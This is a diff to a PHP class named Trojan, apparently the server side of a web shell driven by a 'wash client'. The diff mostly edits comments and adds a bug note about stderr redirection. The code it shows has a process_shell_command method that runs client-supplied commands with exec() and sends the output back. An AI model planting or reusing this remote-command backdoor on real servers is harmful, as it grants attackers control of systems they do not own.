@@ -1,12 +1,7 @@
 <?php
 
-// @todo: probably need to track some kind of options hash over here
-// @todo: it would be awesome to build a compatiblity layer for programs like 
-// top that don't (I don't think) write to stdout
 // @note @todo: all trojans should support some kind of "help" command to show
 // you what payloads they're carrying
-// @todo: it would be rad as hell if I could get tab-completion to work
-
 class Trojan{
     private $command         = '';
     private $cwd             = '';
@@ -73,6 +68,11 @@ class Trojan{
      * Processes a command from the wash client
      *
      * @param string $command          A command - this will change
+     * @bug: When redirecting output to a file, errors are not reported to the 
+     * shell. This happens because stderr is being directed to stdout, which is 
+     * in turn being redirected into a file. If the error that was to be 
+     * reported was that the redirect file could not be created, however, 
+     * output just goes to a black hole. @see Github issue #38.
      */
     private function process_shell_command($command){
         # buffer the command from the client, in case we ever want to refer
@@ -92,7 +92,7 @@ class Trojan{
         exec($command, $this->output_raw);
 
         # buffer the results
-        $this->cwd                        = array_pop($this->output_raw);
+        $this->cwd = array_pop($this->output_raw);
         $this->response = array(
             'output'         => join($this->output_raw, "\n"),
             'prompt_context' => $this->get_prompt_context(),
